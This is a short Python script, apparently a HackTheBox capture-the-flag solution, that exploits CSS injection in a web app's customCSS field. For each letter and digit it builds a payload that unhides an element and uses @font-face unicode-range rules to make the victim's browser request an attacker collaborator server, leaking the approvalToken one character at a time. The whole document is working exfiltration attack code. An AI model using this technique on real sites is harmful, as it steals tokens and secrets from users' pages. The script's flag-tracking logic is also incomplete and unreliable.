import requests
from time import sleep
import string

COLLAB_SERVER = "PUT_YOUR_COLLAB_SERVER_HERE"
API_ENDPOINT = "HTB_SERVER_ADDR_HERE/api/submission/submit"

def send_request(api_url, css_payload):
    try:
        response = requests.post(api_url, json={"customCSS": css_payload})
        return response.text
    except Exception as error:
        print(f"Error during request: {error}")
        return None

def create_payload(server_url, character, unicode_value):

    return f"""
    .d-none {{ display: block !important; }}
    
    #approvalToken {{
        font-family: 'vuln';
    }}
    
    @font-face {{
        font-family: 'vuln';
        src: url("{server_url}/?{character}");
        unicode-range: U+00{unicode_value};
    }}
    """

def brute_force_flag():
    """
    Attempts to brute-force the flag by iterating through potential characters.
    """
    initial_submission_count = 0
    discovered_flag = ""

    characters_to_test = string.ascii_letters + string.digits  # A-Z, a-z, 0-9

    for current_character in characters_to_test:
        if current_character not in discovered_flag:
            unicode_hex = f"{ord(current_character):02X}"  # ASCII to hex
            css_payload = create_payload(COLLAB_SERVER, current_character, unicode_hex)
            
            print(f"Generated payload for '{current_character}':\n{css_payload}")

            api_response = send_request(API_ENDPOINT, css_payload)
            if api_response:
                try:
                    submission_count = int(api_response.split(")")[0].split(" ")[-1])
                    if submission_count < initial_submission_count:
                        print("Anomaly detected in submission count.")
                except ValueError:
                    print("Unexpected response format.")
            sleep(1)

if __name__ == "__main__":
    brute_force_flag()
